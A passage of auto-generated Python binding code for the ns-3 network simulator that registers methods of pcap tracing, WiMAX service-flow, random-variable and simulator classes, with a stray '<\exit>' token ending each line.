[])<\exit>
cls.add_method('Close',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Diff',<\exit>
'bool',<\exit>
[param('std::string const &', 'f1'), param('std::string const &', 'f2'), param('uint32_t &', 'sec'), param('uint32_t &', 'usec'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT')],<\exit>
is_static=True)<\exit>
cls.add_method('Eof',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Fail',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDataLinkType',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetMagic',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSigFigs',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSnapLen',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSwapMode',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('GetTimeZoneOffset',<\exit>
'int32_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMajor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMinor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('Init',<\exit>
'void',<\exit>
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT'), param('int32_t', 'timeZoneCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT'), param('bool', 'swapMode', default_value='false')])<\exit>
cls.add_method('Open',<\exit>
'void',<\exit>
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])<\exit>
cls.add_method('Read',<\exit>
'void',<\exit>
[param('uint8_t * const', 'data'), param('uint32_t', 'maxBytes'), param('uint32_t &', 'tsSec'), param('uint32_t &', 'tsUsec'), param('uint32_t &', 'inclLen'), param('uint32_t &', 'origLen'), param('uint32_t &', 'readLen')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('uint8_t const * const', 'data'), param('uint32_t', 'totalLen')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_static_attribute('SNAPLEN_DEFAULT', 'uint32_t const', is_const=True)<\exit>
cls.add_static_attribute('ZONE_DEFAULT', 'int32_t const', is_const=True)<\exit>
return<\exit>
def register_Ns3PcapHelper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PcapHelper const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateFile',<\exit>
'ns3::Ptr< ns3::PcapFileWrapper >',<\exit>
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode'), param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='65535'), param('int32_t', 'tzCorrection', default_value='0')])<\exit>
cls.add_method('GetFilenameFromDevice',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])<\exit>
cls.add_method('GetFilenameFromInterfacePair',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])<\exit>
return<\exit>
def register_Ns3PcapHelperForDevice_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PcapHelperForDevice const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcap',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcapAll',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('EnablePcapInternal',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous'), param('bool', 'explicitFilename')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3RandomVariable_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::RandomVariable const &', 'o')])<\exit>
cls.add_method('GetInteger',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3SNRToBlockErrorRateManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SNRToBlockErrorRateManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('ActivateLoss',<\exit>
'void',<\exit>
[param('bool', 'loss')])<\exit>
cls.add_method('GetBlockErrorRate',<\exit>
'double',<\exit>
[param('double', 'SNR'), param('uint8_t', 'modulation')])<\exit>
cls.add_method('GetSNRToBlockErrorRateRecord',<\exit>
'ns3::SNRToBlockErrorRateRecord *',<\exit>
[param('double', 'SNR'), param('uint8_t', 'modulation')])<\exit>
cls.add_method('GetTraceFilePath',<\exit>
'std::string',<\exit>
[])<\exit>
cls.add_method('LoadDefaultTraces',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('LoadTraces',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ReLoadTraces',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetTraceFilePath',<\exit>
'void',<\exit>
[param('char *', 'traceFilePath')])<\exit>
return<\exit>
def register_Ns3SNRToBlockErrorRateRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SNRToBlockErrorRateRecord const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'snrValue'), param('double', 'bitErrorRate'), param('double', 'BlockErrorRate'), param('double', 'sigma2'), param('double', 'I1'), param('double', 'I2')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::SNRToBlockErrorRateRecord *',<\exit>
[])<\exit>
cls.add_method('GetBitErrorRate',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetBlockErrorRate',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetI1',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetI2',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetSNRValue',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('GetSigma2',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('SetBitErrorRate',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetBlockErrorRate',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetI1',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetI2',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('SetSNRValue',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
return<\exit>
def register_Ns3SSRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SSRecord const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_constructor([param('ns3::Mac48Address', 'macAddress'), param('ns3::Ipv4Address', 'IPaddress')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('DisablePollForRanging',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('EnablePollForRanging',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetAreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBasicCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDsaRsp',<\exit>
'ns3::DsaRsp',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDsaRspRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowBe',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowNrtps',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowRtps',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHasServiceFlowUgs',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIPAddress',<\exit>
'ns3::Ipv4Address',<\exit>
[])<\exit>
cls.add_method('GetInvitedRangRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIsBroadcastSS',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetModulationType',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPollForRanging',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPollMeBit',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPrimaryCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingCorrectionRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingStatus',<\exit>
'ns3::WimaxNetDevice::RangingStatus',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlows',<\exit>
'std::vector< ns3::ServiceFlow * >',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IncrementDsaRspRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('IncrementInvitedRangingRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('IncrementRangingCorrectionRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ResetInvitedRangingRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ResetRangingCorrectionRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetAreServiceFlowsAllocated',<\exit>
'void',<\exit>
[param('bool', 'val')])<\exit>
cls.add_method('SetBasicCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'basicCid')])<\exit>
cls.add_method('SetDsaRsp',<\exit>
'void',<\exit>
[param('ns3::DsaRsp', 'dsaRsp')])<\exit>
cls.add_method('SetDsaRspRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'dsaRspRetries')])<\exit>
cls.add_method('SetIPAddress',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'IPaddress')])<\exit>
cls.add_method('SetIsBroadcastSS',<\exit>
'void',<\exit>
[param('bool', 'arg0')])<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_method('SetModulationType',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetPollMeBit',<\exit>
'void',<\exit>
[param('bool', 'pollMeBit')])<\exit>
cls.add_method('SetPrimaryCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'primaryCid')])<\exit>
cls.add_method('SetRangingStatus',<\exit>
'void',<\exit>
[param('ns3::WimaxNetDevice::RangingStatus', 'rangingStatus')])<\exit>
cls.add_method('SetSfTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'sfTransactionId')])<\exit>
return<\exit>
def register_Ns3SeedManager_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SeedManager const &', 'arg0')])<\exit>
cls.add_method('CheckSeed',<\exit>
'bool',<\exit>
[param('uint32_t', 'seed')],<\exit>
is_static=True)<\exit>
cls.add_method('GetRun',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSeed',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('SetRun',<\exit>
'void',<\exit>
[param('uint32_t', 'run')],<\exit>
is_static=True)<\exit>
cls.add_method('SetSeed',<\exit>
'void',<\exit>
[param('uint32_t', 'seed')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SendParams_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SendParams const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3SequentialVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SequentialVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('double', 'i', default_value='1'), param('uint32_t', 'c', default_value='1')])<\exit>
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('ns3::RandomVariable const &', 'i'), param('uint32_t', 'c', default_value='1')])<\exit>
return<\exit>
def register_Ns3ServiceFlow_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Tlv', 'tlv')])<\exit>
cls.add_constructor([param('ns3::ServiceFlow::Direction', 'direction')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ServiceFlow const &', 'sf')])<\exit>
cls.add_constructor([param('uint32_t', 'sfid'), param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])<\exit>
cls.add_method('CheckClassifierMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],<\exit>
is_const=True)<\exit>
cls.add_method('CleanUpQueue',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('CopyParametersFrom',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('GetArqBlockLifeTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqBlockSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqDeliverInOrder',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqEnable',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqPurgeTimeout',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqRetryTimeoutRx',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqRetryTimeoutTx',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqSyncLoss',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqWindowSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConvergenceSublayerParam',<\exit>
'ns3::CsParameters',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCsSpecification',<\exit>
'ns3::ServiceFlow::CsSpecification',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDirection',<\exit>
'ns3::ServiceFlow::Direction',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFixedversusVariableSduIndicator',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIsEnabled',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaxSustainedTrafficRate',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaxTrafficBurst',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaximumLatency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMinReservedTrafficRate',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMinTolerableTrafficRate',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetModulation',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQosParamSetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQueue',<\exit>
'ns3::Ptr< ns3::WimaxMacQueue >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRecord',<\exit>
'ns3::ServiceFlowRecord *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestTransmissionPolicy',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSchedulingType',<\exit>
'ns3::ServiceFlow::SchedulingType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSchedulingTypeStr',<\exit>
'char *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSduSize',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceClassName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceSchedulingType',<\exit>
'ns3::ServiceFlow::SchedulingType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTargetSAID',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetToleratedJitter',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTrafficPriority',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'ns3::ServiceFlow::Type',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUnsolicitedGrantInterval',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUnsolicitedPollingInterval',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('InitValues',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('PrintQoSParameters',<\exit>
'void',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetArqBlockLifeTime',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqBlockSize',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqDeliverInOrder',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetArqEnable',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetArqPurgeTimeout',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqRetryTimeoutRx',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqRetryTimeoutTx',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqSyncLoss',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqWindowSize',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])<\exit>
cls.add_method('SetConvergenceSublayerParam',<\exit>
'void',<\exit>
[param('ns3::CsParameters', 'arg0')])<\exit>
cls.add_method('SetCsSpecification',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::CsSpecification', 'arg0')])<\exit>
cls.add_method('SetDirection',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::Direction', 'direction')])<\exit>
cls.add_method('SetFixedversusVariableSduIndicator',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetIsEnabled',<\exit>
'void',<\exit>
[param('bool', 'isEnabled')])<\exit>
cls.add_method('SetIsMulticast',<\exit>
'void',<\exit>
[param('bool', 'isMulticast')])<\exit>
cls.add_method('SetMaxSustainedTrafficRate',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMaxTrafficBurst',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMaximumLatency',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMinReservedTrafficRate',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMinTolerableTrafficRate',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetModulation',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetQosParamSetType',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetRecord',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'record')])<\exit>
cls.add_method('SetRequestTransmissionPolicy',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetSduSize',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetServiceClassName',<\exit>
'void',<\exit>
[param('std::string', 'arg0')])<\exit>
cls.add_method('SetServiceSchedulingType',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'arg0')])<\exit>
cls.add_method('SetSfid',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetTargetSAID',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetToleratedJitter',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetTrafficPriority',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::Type', 'type')])<\exit>
cls.add_method('SetUnsolicitedGrantInterval',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetUnsolicitedPollingInterval',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('ToTlv',<\exit>
'ns3::Tlv',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ServiceFlowRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ServiceFlowRecord const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBacklogged',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBackloggedTemp',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBwSinceLastExpiry',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetBytesRcvd',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBytesSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGrantSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGrantTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGrantedBandwidth',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetGrantedBandwidthTemp',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetLastGrantTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPktsRcvd',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPktsSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestedBandwidth',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('IncreaseBacklogged',<\exit>
'void',<\exit>
[param('uint32_t', 'backlogged')])<\exit>
cls.add_method('IncreaseBackloggedTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'backloggedTemp')])<\exit>
cls.add_method('SetBacklogged',<\exit>
'void',<\exit>
[param('uint32_t', 'backlogged')])<\exit>
cls.add_method('SetBackloggedTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'backloggedTemp')])<\exit>
cls.add_method('SetBwSinceLastExpiry',<\exit>
'void',<\exit>
[param('uint32_t', 'bwSinceLastExpiry')])<\exit>
cls.add_method('SetBytesRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesRcvd')])<\exit>
cls.add_method('SetBytesSent',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesSent')])<\exit>
cls.add_method('SetDlTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'dlTimeStamp')])<\exit>
cls.add_method('SetGrantSize',<\exit>
'void',<\exit>
[param('uint32_t', 'grantSize')])<\exit>
cls.add_method('SetGrantTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'grantTimeStamp')])<\exit>
cls.add_method('SetGrantedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidth')])<\exit>
cls.add_method('SetGrantedBandwidthTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidthTemp')])<\exit>
cls.add_method('SetLastGrantTime',<\exit>
'void',<\exit>
[param('ns3::Time', 'grantTime')])<\exit>
cls.add_method('SetPktsRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsRcvd')])<\exit>
cls.add_method('SetPktsSent',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsSent')])<\exit>
cls.add_method('SetRequestedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'requestedBandwidth')])<\exit>
cls.add_method('UpdateBwSinceLastExpiry',<\exit>
'void',<\exit>
[param('uint32_t', 'bwSinceLastExpiry')])<\exit>
cls.add_method('UpdateBytesRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesRcvd')])<\exit>
cls.add_method('UpdateBytesSent',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesSent')])<\exit>
cls.add_method('UpdateGrantedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidth')])<\exit>
cls.add_method('UpdateGrantedBandwidthTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidthTemp')])<\exit>
cls.add_method('UpdatePktsRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsRcvd')])<\exit>
cls.add_method('UpdatePktsSent',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsSent')])<\exit>
cls.add_method('UpdateRequestedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'requestedBandwidth')])<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3Simulator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Simulator const &', 'arg0')])<\exit>
cls.add_method('Cancel',<\exit>
'void',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('Destroy',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetContext',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetDelayLeft',<\exit>
